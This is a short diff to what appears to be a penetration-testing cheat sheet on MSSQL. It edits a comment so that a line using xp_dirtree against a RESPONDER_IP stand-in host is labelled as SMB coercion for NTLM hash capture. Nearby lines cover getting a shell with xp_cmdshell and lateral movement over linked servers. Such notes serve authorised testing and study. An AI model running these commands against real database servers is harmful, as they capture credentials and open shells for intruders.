@@ -26,7 +26,7 @@
 
  - enable xp_cmdshell --> xp_cmdshell COMMAND (Gives low access shell)
 
- - EXEC MASTER.sys.xp_dirtree '\\RESPONDER_IP\test', 1, 1 (Coerce SMB)
+ - EXEC MASTER.sys.xp_dirtree '\\RESPONDER_IP\test', 1, 1 (Coerce SMB. NTLM Hash Capture)
 
  - trustlink --> sp_linkedservers --> use_link (MSSQL Lateral Movement)
 
